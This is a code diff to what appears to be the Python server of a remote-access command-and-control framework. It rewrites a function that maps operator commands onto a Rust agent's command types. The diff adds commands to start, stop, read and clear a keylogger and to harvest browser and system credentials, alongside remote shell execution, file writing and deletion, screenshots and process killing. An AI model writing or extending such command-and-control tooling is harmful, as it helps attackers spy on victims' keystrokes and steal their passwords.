@@ -117,29 +117,37 @@ async def api_status():
 # ============ Command Format Conversion ============
 
 def convert_to_rust_command(cmd: dict) -> dict:
-    """Convert frontend command format to Rust CommandType enum format"""
+    """Convert frontend command format to Rust CommandType enum format.
+    Must match the serde rename attributes in agent/src/executor.rs CommandType.
+    """
     cmd_type = cmd.get("command_type", "shell")
-    if cmd_type == "shell":
-        return {"Shell": {"command": cmd.get("command", "")}}
-    elif cmd_type == "execute":
-        return {"Execute": {"program": cmd.get("program", ""), "args": cmd.get("args", [])}}
-    elif cmd_type == "whoami":
-        return "WhoAmI"
-    elif cmd_type == "pwd":
-        return "Pwd"
-    elif cmd_type == "list_dir":
-        return {"ListDir": {"path": cmd.get("path", ".")}}
-    elif cmd_type == "read_file":
-        return {"ReadFile": {"path": cmd.get("path", "")}}
-    elif cmd_type == "system_info":
-        return "SystemInfo"
-    elif cmd_type == "process_list":
-        return "ProcessList"
-    elif cmd_type == "screenshot":
-        return "Screenshot"
-    elif cmd_type == "network_info":
-        return "NetworkInfo"
-    return {"Shell": {"command": cmd.get("command", str(cmd))}}
+    mapping = {
+        "shell": lambda: {"shell": {"command": cmd.get("command", "")}},
+        "execute": lambda: {"execute": {"program": cmd.get("program", ""), "args": cmd.get("args", [])}},
+        "whoami": lambda: "whoami",
+        "pwd": lambda: "pwd",
+        "list_dir": lambda: {"ls": {"path": cmd.get("path", ".")}},
+        "read_file": lambda: {"cat": {"path": cmd.get("path", "")}},
+        "write_file": lambda: {"write": {"path": cmd.get("path", ""), "content": cmd.get("content", "")}},
+        "delete_file": lambda: {"delete": {"path": cmd.get("path", "")}},
+        "mkdir": lambda: {"mkdir": {"path": cmd.get("path", "")}},
+        "system_info": lambda: "systeminfo",
+        "process_list": lambda: "ps",
+        "kill_process": lambda: {"kill": {"pid": cmd.get("pid", 0)}},
+        "network_info": lambda: "ifconfig",
+        "screenshot": lambda: "screenshot",
+        "echo": lambda: {"echo": {"message": cmd.get("message", "")}},
+        "keylogger_start": lambda: "keylogger_start",
+        "keylogger_stop": lambda: "keylogger_stop",
+        "keylogger_logs": lambda: "keylogger_logs",
+        "keylogger_clear": lambda: "keylogger_clear",
+        "credentials_browser": lambda: "credentials_browser",
+        "credentials_system": lambda: "credentials_system",
+        "credentials_all": lambda: "credentials_all",
+    }
+    if cmd_type in mapping:
+        return mapping[cmd_type]()
+    return {"shell": {"command": cmd.get("command", str(cmd))}}
 
 
 # ============ WebSocket Endpoints ============
